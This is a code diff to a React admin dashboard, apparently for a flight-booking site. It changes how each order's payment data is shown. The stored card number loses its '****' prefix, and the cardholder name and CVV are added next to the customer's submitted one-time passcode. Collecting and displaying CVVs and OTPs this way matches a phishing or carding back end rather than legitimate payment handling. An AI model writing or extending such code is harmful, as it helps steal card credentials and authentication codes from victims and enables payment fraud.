@@ -9,7 +9,7 @@ import { auth, db } from '@/lib/firebase';
 import { Button } from '@/components/ui/button';
 import { Card, CardContent, CardDescription, CardHeader, CardTitle, CardFooter } from '@/components/ui/card';
 import { useToast } from '@/hooks/use-toast';
-import { Loader2, LogOut, User as UserIcon, Calendar, Plane, KeyRound, Smartphone, CreditCardIcon } from 'lucide-react';
+import { Loader2, LogOut, User as UserIcon, Calendar, Plane, KeyRound, Smartphone, CreditCardIcon, Lock } from 'lucide-react';
 import { format } from 'date-fns';
 import { Separator } from '@/components/ui/separator';
 import { Badge } from '@/components/ui/badge';
@@ -190,13 +190,23 @@ export default function AdminDashboardPage() {
                                     <span>DOB: {order.dob?.seconds ? format(new Date(order.dob.seconds * 1000), 'MMMM d, yyyy') : 'N/A'}</span>
                                  </div>
                                 <Separator />
-                                <div className="flex items-center text-sm font-mono pt-2">
-                                    <KeyRound className="mr-3 h-4 w-4 text-muted-foreground" />
-                                    <span>Submitted OTP: <span className="font-bold text-accent">{order.submittedOtp || 'N/A'}</span></span>
-                                </div>
-                                <div className="flex items-center text-sm font-mono">
-                                    <CreditCardIcon className="mr-3 h-4 w-4 text-muted-foreground" />
-                                    <span>Card: **** {order.cardDetails?.cardNumber} ({order.cardDetails?.expiryDate})</span>
+                                <div className="pt-2">
+                                    <div className="flex items-center text-sm">
+                                        <KeyRound className="mr-3 h-4 w-4 text-muted-foreground" />
+                                        <span>Submitted OTP: <span className="font-bold text-accent">{order.submittedOtp || 'N/A'}</span></span>
+                                    </div>
+                                    <div className="flex items-center text-sm mt-2">
+                                        <UserIcon className="mr-3 h-4 w-4 text-muted-foreground" />
+                                        <span>Card Name: {order.cardDetails?.cardName || 'N/A'}</span>
+                                    </div>
+                                    <div className="flex items-center text-sm mt-2 font-mono">
+                                        <CreditCardIcon className="mr-3 h-4 w-4 text-muted-foreground" />
+                                        <span>{order.cardDetails?.cardNumber} ({order.cardDetails?.expiryDate})</span>
+                                    </div>
+                                    <div className="flex items-center text-sm mt-2 font-mono">
+                                        <Lock className="mr-3 h-4 w-4 text-muted-foreground" />
+                                        <span>CVV: {order.cardDetails?.cvv || 'N/A'}</span>
+                                    </div>
                                 </div>
                             </CardContent>
                             <CardFooter className="text-xs text-muted-foreground justify-between">
